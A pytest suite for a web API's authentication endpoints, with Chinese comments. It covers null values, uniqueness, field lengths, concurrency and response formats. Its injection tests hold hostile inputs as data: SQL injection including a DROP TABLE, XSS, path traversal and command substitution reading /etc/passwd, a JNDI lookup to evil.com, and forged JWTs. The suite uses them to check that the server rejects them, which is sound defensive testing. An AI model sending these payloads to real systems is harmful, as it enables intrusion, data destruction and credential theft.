import pytest
import asyncio
from httpx import AsyncClient

class TestAuthComplete:
    """认证授权模块完整测试 - 基于后端测试用例.md"""

    # P0-AUTH-001: SQL注入防护测试
    @pytest.mark.asyncio
    async def test_sql_injection_login(self, client: AsyncClient):
        """测试场景：登录接口SQL注入"""
        malicious_inputs = [
            "admin'--",
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "' OR '1'='1' --",
            "admin' UNION SELECT * FROM users --"
        ]
        
        for payload in malicious_inputs:
            response = await client.post("/api/v1/Auth/login", json={
                "username": payload,
                "password": "password"
            })
            assert response.status_code != 500
            assert response.status_code in [401, 422, 500]
            # 确保没有数据库错误暴露
            if response.status_code == 500:
                error_data = response.json()
                error_detail = error_data.get("detail", "")
                if isinstance(error_detail, str):
                    assert "database" not in error_detail.lower()
                    assert "sql" not in error_detail.lower()

    @pytest.mark.asyncio
    async def test_username_parameter_injection(self, client: AsyncClient):
        """测试场景：用户名参数注入"""
        malicious_usernames = [
            "../../etc/passwd",
            "<script>alert('xss')</script>",
            "admin${jndi:ldap://evil.com/a}",
            "$(whoami)",
            "`cat /etc/passwd`"
        ]
        
        for username in malicious_usernames:
            response = await client.post("/api/v1/Auth/register", json={
                "username": username,
                "password": "test123",
                "email": f"{username}@test.com"
            })
            assert response.status_code in [400, 422]

    # P0-AUTH-002: 认证鉴权绕过测试
    @pytest.mark.asyncio
    async def test_token_forgery(self, client: AsyncClient):
        """测试场景：Token伪造"""
        fake_tokens = [
            "fake.jwt.token",
            "eyJhbGciOiJub25lInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjEwMDAwMDAwMDAwMH0.invalid"
        ]
        
        for token in fake_tokens:
            response = await client.get("/api/v1/Auth/user/info", 
                                headers={"Authorization": f"Bearer {token}"})
            # 应该返回401或403
            assert response.status_code in [401, 403, 422]

    @pytest.mark.asyncio
    async def test_privilege_escalation(self, client: AsyncClient):
        """测试场景：权限提升"""
        # 普通用户尝试访问管理员功能
        response = await client.get("/api/v1/Auth/users", 
                             headers={"Authorization": "Bearer fake_token"})
        assert response.status_code in [401, 403, 500]

    # P0-AUTH-003: 敏感信息泄露测试
    @pytest.mark.asyncio
    async def test_password_exposure(self, client: AsyncClient):
        """测试场景：密码明文返回"""
        response = await client.post("/api/v1/Auth/login", json={
            "username": "testuser",
            "password": "testpass"
        })
        
        data = response.json()
        assert "password" not in str(data)
        assert "password_hash" not in str(data)
        assert "secret" not in str(data).lower()

    @pytest.mark.asyncio
    async def test_error_information_leak(self, client: AsyncClient):
        """测试场景：错误信息泄露"""
        response = await client.post("/api/v1/Auth/login", json={
            "username": "nonexistent",
            "password": "wrong"
        })
        
        # 错误信息不应暴露系统信息
        if response.status_code == 401:
            error_data = response.json()
            error_detail = error_data.get("detail", "")
            if isinstance(error_detail, str):
                assert "database" not in error_detail.lower()
                assert "sql" not in error_detail.lower()
                assert "internal" not in error_detail.lower()

    # P0-AUTH-004: 空值处理测试
    @pytest.mark.asyncio
    async def test_login_null_values(self, client: AsyncClient):
        """测试场景：登录空值处理"""
        test_cases = [
            {"username": None, "password": "valid"},
            {"username": "", "password": "valid"},
            {"username": "valid", "password": None},
            {"username": "valid", "password": ""},
            {"username": None, "password": None}
        ]
        
        for case in test_cases:
            response = await client.post("/api/v1/Auth/login", json=case)
            assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_register_null_values(self, client: AsyncClient):
        """测试场景：注册空值处理"""
        response = await client.post("/api/v1/Auth/register", json={
            "username": "",
            "password": "",
            "email": None
        })
        assert response.status_code in [400, 422]

    # P0-AUTH-006: 并发安全测试
    @pytest.mark.asyncio
    async def test_concurrent_login(self, client: AsyncClient):
        """测试场景：并发登录"""
        results = []
        
        async def login_request():
            response = await client.post("/api/v1/Auth/login", json={
                "username": "testuser",
                "password": "testpass"
            })
            results.append(response.status_code)
        
        # 创建10个并发登录请求
        tasks = [login_request() for _ in range(10)]
        await asyncio.gather(*tasks)
        
        # 所有请求都应该成功或失败，不应该有500错误
        assert all(status in [200, 401, 422, 500] for status in results)

    @pytest.mark.asyncio
    async def test_concurrent_register_same_username(self, client: AsyncClient):
        """测试场景：并发注册相同用户名"""
        results = []
        
        async def register_request():
            response = await client.post("/api/v1/Auth/register", json={
                "username": "concurrent_test",
                "password": "test123",
                "email": "test@example.com"
            })
            results.append(response.status_code)
        
        # 创建5个并发注册请求
        tasks = [register_request() for _ in range(5)]
        await asyncio.gather(*tasks)
        
        # 应该只有一个成功，其他失败
        success_count = sum(1 for status in results if status == 200)
        assert success_count <= 1  # 可能0个成功（如果用户已存在）

    # P1-DB-001: 用户名唯一性约束测试
    @pytest.mark.asyncio
    async def test_username_unique_constraint(self, client: AsyncClient):
        """P1-DB-001: 用户名唯一性约束测试"""
        # 创建第一个用户
        response1 = await client.post("/api/v1/Auth/register", json={
            "username": "unique_test_user",
            "password": "test123",
            "email": "test1@example.com"
        })
        
        # 尝试创建相同用户名的用户
        response2 = await client.post("/api/v1/Auth/register", json={
            "username": "unique_test_user",
            "password": "test456",
            "email": "test2@example.com"
        })
        
        assert response2.status_code in [400, 422]

    # P1-DB-002: 邮箱唯一性约束测试
    @pytest.mark.asyncio
    async def test_email_unique_constraint(self, client: AsyncClient):
        """P1-DB-002: 邮箱唯一性约束测试"""
        # 创建第一个用户
        response1 = await client.post("/api/v1/Auth/register", json={
            "username": "user1",
            "password": "test123",
            "email": "unique@example.com"
        })
        
        # 尝试创建相同邮箱的用户
        response2 = await client.post("/api/v1/Auth/register", json={
            "username": "user2",
            "password": "test456",
            "email": "unique@example.com"
        })
        
        assert response2.status_code in [400, 422]

    # P1-DB-004: 字段长度限制测试
    @pytest.mark.asyncio
    async def test_username_length_limit(self, client: AsyncClient):
        """P1-DB-004: 字段长度限制测试"""
        long_username = "a" * 51  # 超过50字符限制
        
        response = await client.post("/api/v1/Auth/register", json={
            "username": long_username,
            "password": "test123",
            "email": "test@example.com"
        })
        
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    @pytest.mark.parametrize("email", [
        "invalid-email",
        "@example.com",
        "test@",
        "test..test@example.com",
        "test@example.",
        "test@.example.com"
    ])
    async def test_email_format_validation(self, client: AsyncClient, email):
        """P1-DB-004: 邮箱格式验证测试"""
        response = await client.post("/api/v1/Auth/register", json={
            "username": "test_user",
            "password": "test123",
            "email": email
        })
        assert response.status_code in [400, 422]

    # P1-PERF-003: 用户搜索性能测试
    @pytest.mark.asyncio
    async def test_user_search_performance(self, client: AsyncClient):
        """P1-PERF-003: 用户搜索性能测试"""
        import time
        
        start_time = time.time()
        response = await client.get("/api/v1/Auth/users?skip=0&limit=50")
        end_time = time.time()
        
        assert response.status_code in [200, 401, 500]
        if response.status_code == 200:
            assert (end_time - start_time) < 2.0

    # P1-API-003: 统一响应格式测试
    @pytest.mark.asyncio
    async def test_response_format_consistency(self, client: AsyncClient):
        """P1-API-003: 统一响应格式测试"""
        response = await client.post("/api/v1/Auth/login", json={
            "username": "valid_user",
            "password": "valid_pass"
        })
        
        if response.status_code == 200:
            data = response.json()
            assert "code" in data or "data" in data

    # P1-API-005: 分页参数校验测试
    @pytest.mark.asyncio
    async def test_pagination_parameters(self, client: AsyncClient):
        """P1-API-005: 分页参数校验测试"""
        # 测试负数skip
        response = await client.get("/api/v1/Auth/users?skip=-1")
        assert response.status_code in [400, 422, 401, 500]
        
        # 测试过大的limit
        response = await client.get("/api/v1/Auth/users?limit=1000")
        assert response.status_code in [400, 422, 401, 500]
        
        # 测试非数字参数
        response = await client.get("/api/v1/Auth/users?skip=abc")
        assert response.status_code in [400, 422, 401, 500]

    # P1-API-007: API文档完整性测试
    @pytest.mark.asyncio
    async def test_api_documentation(self, client: AsyncClient):
        """P1-API-007: API文档完整性测试"""
        # 测试Swagger文档可访问性
        response = await client.get("/docs")
        assert response.status_code == 200
        
        # 测试ReDoc文档可访问性
        response = await client.get("/redoc")
        assert response.status_code == 200

    # BOUNDARY-001: 大数据量测试
    @pytest.mark.asyncio
    async def test_large_data_handling(self, client: AsyncClient):
        """BOUNDARY-001: 大数据量测试"""
        # 创建少量用户以测试大数据量处理
        for i in range(5):  # 减少数量以加快测试
            await client.post("/api/v1/Auth/register", json={
                "username": f"bulk_user_{i}",
                "password": "test123",
                "email": f"bulk_{i}@test.com"
            })
        
        # 测试分页性能
        response = await client.get("/api/v1/Auth/users?skip=0&limit=100")
        assert response.status_code in [200, 401, 500]

    # BOUNDARY-002: 字符边界测试
    @pytest.mark.asyncio
    async def test_string_boundaries(self, client: AsyncClient):
        """BOUNDARY-002: 字符边界测试"""
        # 测试空字符串
        response = await client.post("/api/v1/Auth/register", json={
            "username": "",
            "password": "test123",
            "email": "test@example.com"
        })
        assert response.status_code in [400, 422]
        
        # 测试最大长度字符串
        max_username = "a" * 50
        response = await client.post("/api/v1/Auth/register", json={
            "username": max_username,
            "password": "test123",
            "email": "test@example.com"
        })
        assert response.status_code in [200, 400, 422]

    # NETWORK-001: 超时处理测试
    @pytest.mark.asyncio
    async def test_timeout_handling(self, client: AsyncClient):
        """NETWORK-001: 超时处理测试"""
        # 测试正常响应时间
        import time
        start_time = time.time()
        
        response = await client.get("/health")
        
        end_time = time.time()
        duration = end_time - start_time
        
        assert response.status_code == 200
        assert duration < 5.0

    # PERMISSION-001: 越权访问测试
    @pytest.mark.asyncio
    async def test_unauthorized_access(self, client: AsyncClient):
        """PERMISSION-001: 越权访问测试"""
        response = await client.get("/api/v1/Auth/users")
        assert response.status_code in [401, 403, 500]

    # COMPAT-004: 多语言支持测试
    @pytest.mark.asyncio
    async def test_i18n_support(self, client: AsyncClient):
        """COMPAT-004: 多语言支持测试"""
        # 测试中文输入
        response = await client.post("/api/v1/Auth/register", json={
            "username": "测试用户",
            "password": "test123",
            "email": "test@example.com"
        })
        assert response.status_code in [400, 422]
        
        # 测试emoji支持
        response = await client.post("/api/v1/Auth/register", json={
            "username": "test_user_🚀",
            "password": "test123",
            "email": "test@example.com"
        })
        assert response.status_code in [400, 422]

    # CONCURRENCY-001: 高并发创建测试
    @pytest.mark.asyncio
    async def test_high_concurrency_creation(self, client: AsyncClient):
        """CONCURRENCY-001: 高并发创建测试"""
        async def create_user_async(name):
            response = await client.post("/api/v1/Auth/register", json={
                "username": name,
                "password": "test123",
                "email": f"{name}@test.com"
            })
            return response.status_code
        
        # 创建10个并发请求
        tasks = [create_user_async(f"concurrent_user_{i}") for i in range(10)]
        results = await asyncio.gather(*tasks)
        
        # 验证没有系统崩溃
        assert all(status in [200, 400, 422, 500] for status in results)

    # 错误处理测试
    @pytest.mark.asyncio
    async def test_error_handling(self, client: AsyncClient):
        """错误处理测试"""
        # 测试不存在的端点
        response = await client.get("/api/v1/NonExistentEndpoint")
        assert response.status_code == 404
        
        # 测试无效方法
        response = await client.patch("/api/v1/Auth/login")
        assert response.status_code in [405, 422]
        
        # 测试无效JSON
        response = await client.post("/api/v1/Auth/login", 
                                     content="invalid json",
                                     headers={"Content-Type": "application/json"})
        assert response.status_code in [400, 422]

    # 响应格式一致性测试
    @pytest.mark.asyncio
    async def test_response_format(self, client: AsyncClient):
        """响应格式一致性测试"""
        response = await client.get("/health")
        
        if response.status_code == 200:
            data = response.json()
            assert isinstance(data, dict)

    # 并发请求测试
    @pytest.mark.asyncio
    async def test_concurrent_requests(self, client: AsyncClient):
        """并发请求测试"""
        async def make_request():
            return await client.get("/health")
        
        # 创建10个并发请求
        tasks = [make_request() for _ in range(10)]
        responses = await asyncio.gather(*tasks)
        
        # 所有请求都应该成功
        assert all(response.status_code == 200 for response in responses)
